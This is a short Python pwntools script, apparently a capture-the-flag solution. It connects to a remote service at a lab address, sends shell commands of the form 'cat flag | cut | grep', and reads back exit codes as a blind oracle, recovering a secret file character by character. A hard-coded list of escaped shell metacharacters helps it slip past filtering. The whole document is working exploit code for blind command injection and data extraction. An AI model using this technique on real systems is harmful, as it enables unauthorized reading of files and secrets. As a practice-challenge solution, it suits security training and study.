#!/usr/bin/env python
from pwn import *
from string import printable

#context.log_level = 'debug'

table = printable
table = table.replace('*', '')
table = table.replace('.', '')
table = table.replace('\n', '')

local = 0
if local:
	p = process('./ret')
else:
	p = remote('10.21.13.111', 10086)

def get_ret(cmd):
	p.recvuntil('> ')
	p.sendline(cmd)
	ret = p.recvuntil('\n', drop=True)
	return int(ret)

fuck = ['!', '\$', '&', '#', '~', ' ', ';', '\t']

cmd = 'cat flag | cut -c -{} | grep {}'
flag = ''
idx = 1
while True:
	sig = 0
	for c in table:
		if c == '$':
			c = '\\' + c
		if c in fuck:
			c = '\\' + c
		buf = cmd.format(idx, flag + c)
#		info(buf)
		ret = get_ret(buf)
		if ret == 0:
			if c == '\\\\$':
				c = '\\$'
			flag += c
			idx += 1
			sig = 1
			break
	info(flag.replace('\\', ''))
	if sig == 0:
		break

p.close()

